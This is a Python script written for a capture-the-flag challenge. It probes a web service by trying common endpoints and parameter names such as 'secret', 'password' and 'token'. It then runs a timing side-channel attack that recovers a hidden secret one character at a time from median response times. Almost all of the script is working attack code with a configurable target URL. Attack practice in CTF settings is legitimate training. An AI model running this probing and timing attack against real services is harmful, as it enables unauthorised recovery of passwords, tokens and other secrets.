#!/usr/bin/env python3
"""
CTF #65 - Quick Timing Attack
Lightweight version - run this first to probe the challenge, then adjust.

Step 1: Run with --probe to discover the API
Step 2: Run with the correct params to extract the secret
"""

import requests
import time
import string
import argparse
import sys
import statistics


BASE_URL = "http://paris.hackdevinci.com:8065"


def probe(url):
    """Probe the challenge to understand its API."""
    s = requests.Session()
    print(f"[*] Probing {url}...")

    # GET /
    try:
        r = s.get(url, timeout=5)
        print(f"\n  GET / => {r.status_code}")
        print(f"  Headers: {dict(r.headers)}")
        print(f"  Body: {r.text[:500]}")
    except Exception as e:
        print(f"  GET / => {e}")

    # Try common paths
    for path in ["/check", "/verify", "/login", "/api", "/hash", "/compare", "/secret"]:
        try:
            r = s.get(f"{url}{path}", timeout=3)
            if r.status_code != 404:
                print(f"\n  GET {path} => {r.status_code}: {r.text[:200]}")
        except:
            pass

    # Try POST with common params
    for param in ["secret", "hash", "password", "key", "token", "flag", "input", "code"]:
        try:
            r = s.post(url, json={param: "test"}, timeout=3)
            if r.status_code != 404:
                print(f"\n  POST / json={{{param}: 'test'}} => {r.status_code}: {r.text[:200]}")
        except:
            pass
        try:
            r = s.post(url, data={param: "test"}, timeout=3)
            if r.status_code != 404 and "method" not in r.text.lower():
                print(f"\n  POST / form={{{param}: 'test'}} => {r.status_code}: {r.text[:200]}")
        except:
            pass

    # Try with query params
    for param in ["secret", "hash", "password", "key", "token"]:
        try:
            r = s.get(url, params={param: "test"}, timeout=3)
            if "missing" not in r.text.lower() and r.status_code != 404:
                print(f"\n  GET /?{param}=test => {r.status_code}: {r.text[:200]}")
        except:
            pass


def attack(url, endpoint, param, method, charset, length, samples, known=""):
    """Perform the timing attack."""
    s = requests.Session()
    found = known

    print(f"\n[*] Timing Attack Config:")
    print(f"    URL: {url}{endpoint}")
    print(f"    Param: {param}")
    print(f"    Method: {method}")
    print(f"    Charset: {charset[:30]}... ({len(charset)} chars)")
    print(f"    Samples: {samples}")
    print(f"    Max length: {length}")
    if known:
        print(f"    Resuming from: '{known}'")
    print()

    for pos in range(len(found), length):
        timings = {}

        for c in charset:
            candidate = found + c
            # Pad to expected length
            padded = candidate.ljust(length, 'a')

            times = []
            for _ in range(samples):
                start = time.perf_counter()
                try:
                    if method == "get":
                        s.get(f"{url}{endpoint}", params={param: padded}, timeout=10)
                    elif method == "post-form":
                        s.post(f"{url}{endpoint}", data={param: padded}, timeout=10)
                    elif method == "post-json":
                        s.post(f"{url}{endpoint}", json={param: padded}, timeout=10)
                except:
                    continue
                elapsed = time.perf_counter() - start
                times.append(elapsed)

            if times:
                timings[c] = statistics.median(times)
            else:
                timings[c] = 0

        # Sort by timing
        ranked = sorted(timings.items(), key=lambda x: x[1], reverse=True)
        best_char, best_time = ranked[0]
        second_time = ranked[1][1] if len(ranked) > 1 else 0
        ratio = best_time / second_time if second_time > 0 else 0

        found += best_char
        top5 = [(c, f"{t*1000:.1f}ms") for c, t in ranked[:5]]
        print(f"  [{pos:2d}] '{best_char}' ({best_time*1000:.1f}ms, ratio={ratio:.2f}) | {top5}")
        print(f"       => {found}")

        # Early termination
        if ratio < 1.005 and pos > 3:
            print(f"\n[!] Timing difference negligible. Secret might be {pos+1} chars.")
            break

    print(f"\n[+] RESULT: {found}")
    return found


def main():
    parser = argparse.ArgumentParser(description="CTF #65 Timing Attack")
    parser.add_argument("--probe", action="store_true", help="Probe the challenge API")
    parser.add_argument("--url", default=BASE_URL, help=f"Base URL (default: {BASE_URL})")
    parser.add_argument("--endpoint", default="/", help="Endpoint path (default: /)")
    parser.add_argument("--param", default="secret", help="Parameter name (default: secret)")
    parser.add_argument("--method", default="post-json", choices=["get", "post-form", "post-json"],
                        help="HTTP method (default: post-json)")
    parser.add_argument("--charset", default="hex",
                        choices=["hex", "alpha", "alnum", "flag", "printable"],
                        help="Character set to use")
    parser.add_argument("--length", type=int, default=32, help="Expected secret length (default: 32)")
    parser.add_argument("--samples", type=int, default=15, help="Samples per char (default: 15)")
    parser.add_argument("--known", default="", help="Known prefix to resume from")

    args = parser.parse_args()

    charsets = {
        "hex": "0123456789abcdef",
        "alpha": string.ascii_lowercase,
        "alnum": string.ascii_lowercase + string.digits,
        "flag": string.ascii_letters + string.digits + "_{}-!",
        "printable": string.printable.strip(),
    }

    if args.probe:
        probe(args.url)
    else:
        attack(args.url, args.endpoint, args.param, args.method,
               charsets[args.charset], args.length, args.samples, args.known)


if __name__ == "__main__":
    main()
